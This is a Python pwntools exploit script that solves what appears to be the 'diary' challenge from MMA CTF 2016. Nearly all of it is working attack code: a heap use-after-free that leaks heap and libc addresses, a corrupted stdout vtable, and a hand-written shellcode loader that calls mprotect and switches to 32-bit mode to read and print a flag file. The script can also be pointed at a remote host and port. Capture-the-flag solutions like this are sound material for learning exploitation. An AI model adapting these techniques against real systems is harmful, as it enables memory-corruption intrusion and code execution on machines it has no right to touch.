#!/usr/bin/env python

from pwn import *
import sys

def register(date, size, note):
    r.sendlineafter(">>", "1")
    r.sendlineafter(" ... ", date)
    r.sendlineafter("size...", str(size))
    if size != 0:
        r.sendafter(date, note)

def delete(date):
    r.sendlineafter(">>", "3")
    r.sendlineafter(" ... ",date)

def show(date):
    r.sendlineafter(">>", "2")
    r.sendlineafter(" ... ",date)
    return r.recvuntil("1.")

def a64(payload):
    return asm(payload, arch='amd64', os='linux')

def exploit(r): 
    # LEAK HEAP
    register("2001/01/01", 0x20, "A\n")
    register("2002/02/02", 0x20, "B\n")
    register("2003/03/03", 0x20, "C\n")
   
    delete("2001/01/01")
    delete("2002/02/02")

    register("2004/04/04", 0x64, "E")
  
    leak = show("2004/04/04")
    heap_base = u64(leak.split("04\n")[1][0:6].ljust(8,'\0'))-0x45
    log.success("mmaped heap base at: "+hex(heap_base))

    # LEAK LIBC
    payload  = p64(0x6020f8) #stdin@bss
    payload += p64(heap_base+0x8)
    register("2005/05/05",0x20, payload+"F"*0x10+"\n")
    delete("2005/05/05")

    leak = show("2004/04/04")
    stdin = u64(leak.split("04\n")[1][0:6].ljust(8,'\0'))
    libc_base = stdin-0x3c48e0
    stdout = libc_base+0x3c5620
    
    log.success("libc base at: "+hex(libc_base))
    log.success("_IO_2_1_stdout_ at: "+hex(stdout))

    # CORRUPT _IO_2_1_STDOUT_->vtable
    payload = p64(heap_base+0x128) # fake vtable  
    payload += p64(stdin+0xd8-0x8) # offset to vtable
    #payload += p64(0x414141414141) # offset to vtable
    register("2006/06/06",0x20, payload+"G"*0x10+"\n")
    
    # 32-BIT SHELLCODE
    # syscall  - rax=0x0, rdi=0x0, rsi=addr, rdx=0x20
    #payload_main = asm(shellcraft.i386.linux.execve('./bash'), arch='x86') <-- fails because need a 32-bit bash binary!
    payload_main = asm(shellcraft.i386.linux.open('./flag'), arch='x86')
    payload_main += asm(shellcraft.i386.linux.read(3, 0x602600, 100), arch='x86')
    payload_main += asm(shellcraft.i386.linux.write(1, 0x602600, 100), arch='x86')

    # 64-BIT SHELLCODE 
    # mprotect - rax=0xa, rdi=dest, rsi=len, rdx=0x7(rwx)
    # read     - rax=0x0, rdi=0(stdin), rsi=dest, rdx=count     
    sc_loader =  ''' 
                 xor rax, rax
                 add eax, 0x8
                 add eax, 0x2
                 mov rdi, 0x602000
                 mov rsi, 0x1000
                 mov rdx, 0x7
                 syscall
    
                 xor rax, rax
                 xor rdi, rdi
                 mov rsi, 0x602200
                 mov rdx, 0x200
                 syscall
                
                 mov rsp, 0x602400
                 mov qword ptr[rsp], 0x602200
                 mov dword ptr[rsp+4], 0x23
                 retf
                 '''            
    payload_loader = "\x90"*0x60 # why need this??
    payload_loader += asm(sc_loader, arch='amd64', os='linux')
    
    register("2007/07/07", 0x100, payload_loader + "\x90"*(0x100-len(payload_loader))) 
    #pause()
    delete("2006/06/06") 
    r.sendline(payload_main)
    r.recvuntil(">>")
    print r.recv(50) # get flag :)
    
    #r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/home/vagrant/CTFs/mmactf16/diary/diary'], env={"LD_PRELOAD":""})
        print util.proc.pidof(r)
        pause()
        exploit(r)
